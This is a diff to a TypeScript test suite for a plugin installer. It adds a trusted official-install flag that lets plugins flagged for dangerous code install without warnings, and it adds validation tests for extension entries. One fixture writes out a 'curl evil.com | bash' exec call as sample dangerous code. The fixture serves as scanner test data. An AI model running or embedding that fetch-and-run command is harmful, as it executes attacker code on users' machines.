@@ -213,11 +213,13 @@ async function installFromDirWithWarnings(params: {
   pluginDir: string;
   extensionsDir: string;
   dangerouslyForceUnsafeInstall?: boolean;
+  trustedSourceLinkedOfficialInstall?: boolean;
   mode?: "install" | "update";
 }) {
   const warnings: string[] = [];
   const result = await installPluginFromDir({
     dangerouslyForceUnsafeInstall: params.dangerouslyForceUnsafeInstall,
+    trustedSourceLinkedOfficialInstall: params.trustedSourceLinkedOfficialInstall,
     dirPath: params.pluginDir,
     extensionsDir: params.extensionsDir,
     mode: params.mode,
@@ -233,11 +235,13 @@ async function installFromArchiveWithWarnings(params: {
   archivePath: string;
   extensionsDir: string;
   dangerouslyForceUnsafeInstall?: boolean;
+  trustedSourceLinkedOfficialInstall?: boolean;
 }) {
   const warnings: string[] = [];
   const result = await installPluginFromArchive({
     archivePath: params.archivePath,
     dangerouslyForceUnsafeInstall: params.dangerouslyForceUnsafeInstall,
+    trustedSourceLinkedOfficialInstall: params.trustedSourceLinkedOfficialInstall,
     extensionsDir: params.extensionsDir,
     logger: {
       info: () => {},
@@ -618,7 +622,7 @@ beforeEach(() => {
 });
 
 describe("installPluginFromArchive", () => {
-  it("does not run npm for package archive runtime dependencies", async () => {
+  it("installs package archive runtime dependencies", async () => {
     const result = await installArchivePackageAndReturnResult({
       packageJson: {
         name: "archive-with-deps",
@@ -631,7 +635,12 @@ describe("installPluginFromArchive", () => {
     });
 
     expect(result.ok).toBe(true);
-    expect(vi.mocked(runCommandWithTimeout)).not.toHaveBeenCalled();
+    expect(vi.mocked(runCommandWithTimeout)).toHaveBeenCalledWith(
+      expect.arrayContaining(["npm", "install"]),
+      expect.objectContaining({
+        cwd: expect.stringContaining(".openclaw-install-stage-"),
+      }),
+    );
   });
 
   it("installs scoped archives, rejects duplicate installs, and allows updates", async () => {
@@ -737,6 +746,32 @@ describe("installPluginFromArchive", () => {
         ),
       ),
     ).toBe(true);
+  });
+
+  it("allows archive installs with dangerous code patterns for trusted source-linked official installs", async () => {
+    const stateDir = suiteTempRootTracker.makeTempDir();
+    const extensionsDir = path.join(stateDir, "extensions");
+    fs.mkdirSync(extensionsDir, { recursive: true });
+
+    const archivePath = await ensureDynamicArchiveTemplate({
+      outName: "official-dangerous-plugin-archive.tgz",
+      packageJson: {
+        name: "official-dangerous-plugin",
+        version: "1.0.0",
+        openclaw: { extensions: ["./dist/index.js"] },
+      },
+      withDistIndex: true,
+      distIndexJsContent: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
+    });
+
+    const { result, warnings } = await installFromArchiveWithWarnings({
+      archivePath,
+      extensionsDir,
+      trustedSourceLinkedOfficialInstall: true,
+    });
+
+    expect(result.ok).toBe(true);
+    expect(warnings).toEqual([]);
   });
 
   it("installs flat-root plugin archives from ClawHub-style downloads", async () => {
@@ -891,6 +926,32 @@ describe("installPluginFromArchive", () => {
     }
   });
 
+  it("rejects package installs when a TypeScript extension entry has no compiled runtime output", async () => {
+    const { pluginDir, extensionsDir } = setupPluginInstallDirs();
+    fs.mkdirSync(path.join(pluginDir, "src"), { recursive: true });
+    fs.writeFileSync(
+      path.join(pluginDir, "package.json"),
+      JSON.stringify({
+        name: "source-only-runtime-plugin",
+        version: "1.0.0",
+        openclaw: { extensions: ["./src/index.ts"] },
+      }),
+    );
+    fs.writeFileSync(path.join(pluginDir, "src", "index.ts"), "export {};\n");
+
+    const result = await installPluginFromDir({
+      dirPath: pluginDir,
+      extensionsDir,
+    });
+
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.error).toContain("requires compiled runtime output");
+      expect(result.error).toContain("./dist/index.js");
+    }
+  });
+
   it("rejects package installs when runtimeExtensions length does not match extensions", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.mkdirSync(path.join(pluginDir, "dist"), { recursive: true });
@@ -917,6 +978,37 @@ describe("installPluginFromArchive", () => {
       expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
       expect(result.error).toContain("runtimeExtensions length (1)");
       expect(result.error).toContain("extensions length (2)");
+    }
+  });
+
+  it("rejects package installs when runtimeExtensions contains a blank entry", async () => {
+    const { pluginDir, extensionsDir } = setupPluginInstallDirs();
+    fs.mkdirSync(path.join(pluginDir, "src"), { recursive: true });
+    fs.mkdirSync(path.join(pluginDir, "dist"), { recursive: true });
+    fs.writeFileSync(
+      path.join(pluginDir, "package.json"),
+      JSON.stringify({
+        name: "runtime-blank-plugin",
+        version: "1.0.0",
+        openclaw: {
+          extensions: ["./src/index.ts"],
+          runtimeExtensions: [" "],
+        },
+      }),
+    );
+    fs.writeFileSync(path.join(pluginDir, "src", "index.ts"), "export {};\n");
+    fs.writeFileSync(path.join(pluginDir, "dist", "index.js"), "export {};\n");
+
+    const result = await installPluginFromDir({
+      dirPath: pluginDir,
+      extensionsDir,
+    });
+
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_OPENCLAW_EXTENSIONS);
+      expect(result.error).toContain("openclaw.runtimeExtensions[0]");
+      expect(result.error).toContain("non-empty string");
     }
   });
 
@@ -1869,6 +1961,32 @@ describe("installPluginFromArchive", () => {
         ),
       ),
     ).toBe(true);
+  });
+
+  it("allows package installs with dangerous code patterns for trusted source-linked official installs", async () => {
+    const { pluginDir, extensionsDir } = setupPluginInstallDirs();
+
+    fs.writeFileSync(
+      path.join(pluginDir, "package.json"),
+      JSON.stringify({
+        name: "official-dangerous-plugin",
+        version: "1.0.0",
+        openclaw: { extensions: ["index.js"] },
+      }),
+    );
+    fs.writeFileSync(
+      path.join(pluginDir, "index.js"),
+      `const { spawn } = require("child_process");\nspawn("google-chrome", []);`,
+    );
+
+    const { result, warnings } = await installFromDirWithWarnings({
+      pluginDir,
+      extensionsDir,
+      trustedSourceLinkedOfficialInstall: true,
+    });
+
+    expect(result.ok).toBe(true);
+    expect(warnings).toEqual([]);
   });
 
   it("does not flag the real qa-matrix plugin as dangerous install code", async () => {
